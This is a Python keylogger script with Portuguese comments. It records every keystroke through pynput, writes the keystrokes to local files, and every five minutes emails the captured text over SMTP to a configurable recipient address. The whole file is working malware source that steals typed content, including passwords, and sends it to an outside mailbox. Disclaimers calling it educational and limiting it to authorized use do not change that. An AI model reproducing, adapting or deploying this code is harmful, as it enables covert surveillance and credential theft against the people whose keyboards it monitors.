from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import time
import threading

# ============================================
# CONFIGURAÇÕES DE EMAIL - PREENCHA AQUI
# ============================================

# Servidor SMTP (exemplos comuns):
# Gmail: smtp.gmail.com (porta 587)
# Outlook/Hotmail: smtp.office365.com (porta 587)
# Yahoo: smtp.mail.yahoo.com (porta 587)
# Proton Mail: smtp.protonmail.ch (porta 587)
# iCloud: smtp.mail.me.com (porta 587)
SMTP_SERVER = "smtp.gmail.com"  # Altere para seu provedor
SMTP_PORT = 587  # 587 para TLS, 465 para SSL

# Credenciais do email remetente
EMAIL_ADDRESS = "seu_email@gmail.com"  # Email que ENVIA os logs
EMAIL_PASSWORD = "sua_senha_de_aplicativo"  # Use senha de aplicativo, não a senha normal

# Email destinatário
DESTINATION_EMAIL = "destino@exemplo.com"  # Email que RECEBE os logs

# Intervalo de envio (em segundos)
SEND_INTERVAL = 300  # 300 segundos = 5 minutos

# Buffer para armazenar teclas
key_buffer = []

ignorate = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def send_email(content):
    """Envia o conteúdo capturado por email"""
    try:
        # Criar mensagem
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = DESTINATION_EMAIL
        msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        body = f"""
Relatório de Captura de Teclado
Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Conteúdo Capturado:
{content}

---
Este é um email automático gerado para fins educacionais.
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        # Conectar ao servidor SMTP
        if SMTP_PORT == 465:
            # SSL direto
            server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
        else:
            # TLS
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
        
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        # Enviar email
        server.send_message(msg)
        server.quit()
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Email enviado com sucesso!")
        return True
        
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Erro ao enviar email: {e}")
        # Salvar em arquivo de backup em caso de falha
        with open("keylog_backup.txt", "a", encoding="utf-8") as f:
            f.write(f"\n--- Backup {datetime.now()} ---\n{content}\n")
        return False

def send_periodic_emails():
    """Envia emails periodicamente com o conteúdo do buffer"""
    global key_buffer
    
    while True:
        time.sleep(SEND_INTERVAL)
        
        if key_buffer:
            content = ''.join(key_buffer)
            if send_email(content):
                # Limpar buffer após envio bem-sucedido
                key_buffer = []

def on_press(key):
    """Captura as teclas pressionadas"""
    try:
        if key not in ignorate:
            char = key.char
            key_buffer.append(char)
            # Também salvar localmente
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                log_file.write(char)
    except AttributeError:
        # Teclas especiais
        if key not in ignorate:
            special_key = ""
            if key == keyboard.Key.space:
                special_key = " "
            elif key == keyboard.Key.enter:
                special_key = "\n"
            elif key == keyboard.Key.backspace:
                special_key = "[BACKSPACE]"
            elif key == keyboard.Key.tab:
                special_key = "[TAB]"
            else:
                special_key = f"[{key}]"
            
            key_buffer.append(special_key)
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                log_file.write(special_key)
    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("KEYLOGGER COM ENVIO DE EMAIL - MODO EDUCACIONAL")
    print("=" * 60)
    print(f"\n📧 Servidor SMTP: {SMTP_SERVER}:{SMTP_PORT}")
    print(f"📤 Remetente: {EMAIL_ADDRESS}")
    print(f"📥 Destinatário: {DESTINATION_EMAIL}")
    print(f"⏱️  Intervalo de envio: {SEND_INTERVAL} segundos ({SEND_INTERVAL//60} minutos)")
    print(f"💾 Backup local: keylog.txt e keylog_backup.txt")
    print("\n⚠️  Use apenas em ambiente controlado e autorizado!")
    print("Pressione Ctrl+C para encerrar\n")
    print("=" * 60)
    
    # Iniciar thread para envio periódico de emails
    email_thread = threading.Thread(target=send_periodic_emails, daemon=True)
    email_thread.start()
    
    # Iniciar listener do teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
